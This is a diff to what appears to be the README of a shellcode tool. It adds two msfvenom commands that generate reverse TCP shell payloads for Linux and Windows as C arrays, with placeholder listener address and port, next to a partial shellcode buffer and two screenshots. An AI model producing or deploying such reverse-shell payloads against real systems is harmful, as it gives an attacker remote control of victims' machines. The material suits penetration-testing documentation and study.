@@ -94,7 +94,16 @@ unsigned char buf[] = "\x6a\x29\x58\x99\x...";
 
 <img width="331" height="873" alt="image" src="https://github.com/user-attachments/assets/9c92957f-c060-47f5-865f-a01c8e5a767b" /> <img width="358" height="815" alt="image" src="https://github.com/user-attachments/assets/af8fc684-ccc7-47b8-a0d5-ebec36decb79" />
 
-
+```bash
+# shellcode 
+# Example Linux
+msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f c -o shellcode_test.txt 
+```
+```bash
+# shellcode 
+# Example Windows
+msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f c -o shellcode_test.txt
+```
 
 ```text
 # Tree
